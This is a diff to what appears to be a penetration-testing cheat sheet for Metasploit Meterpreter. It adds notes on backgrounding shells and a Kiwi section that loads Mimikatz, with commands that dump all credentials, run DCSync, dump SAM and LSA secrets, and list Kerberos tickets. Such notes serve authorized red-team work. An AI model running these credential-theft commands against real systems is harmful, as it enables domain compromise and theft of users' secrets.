@@ -112,12 +112,22 @@ meterpreter> sysinfo
 meterpreter> shell
 ```
 
+If you use `shell` to get a CMD shell, then you can use CTRL+Z to background the shell and return to meterpreter.
+
+```bash
+# list active channels (shells)
+meterpreter> channel -l
+
+# rejoin backgrounded channel (shell)
+meterpreter> channel -i 1
+```
+
 Migrate to another process
 ```bash
 meterpreter> run post/windows/manage/migrate
 ```
 
-Background meterpreter sessions
+Background meterpreter sessions (return to msf console)
 ```bash
 meterpreter> background
 ```
@@ -177,6 +187,53 @@ Check if you are on a virtual machine (honeypot check, but do not rely on this)
 ```bash
 meterpreter> run post/windows/gather/checkvm
 ```
+
+### Kiwi
+
+Use Mimikatz features in a Meterpreter shell.
+
+```bash
+meterpreter> load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+
+meterpreter> help
+```
+
+Retrieve all credentials:
+
+```bash
+meterpreter> creds_all
+```
+
+Domain Controller Sync (DCSYN):
+
+```bash
+meterpreter> dcsync
+meterpreter> dcsync_ntlm
+```
+
+LSA Dump:
+
+```bash
+meterpreter> lsa_dump_sam
+meterpreter> lsa_dump_secrets
+```
+
+
+Kerberos Tickets:
+
+```bash
+meterpreter> kerberos_ticket_list
+```
+
 
 ## Pivoting
 ### SOCKS proxy
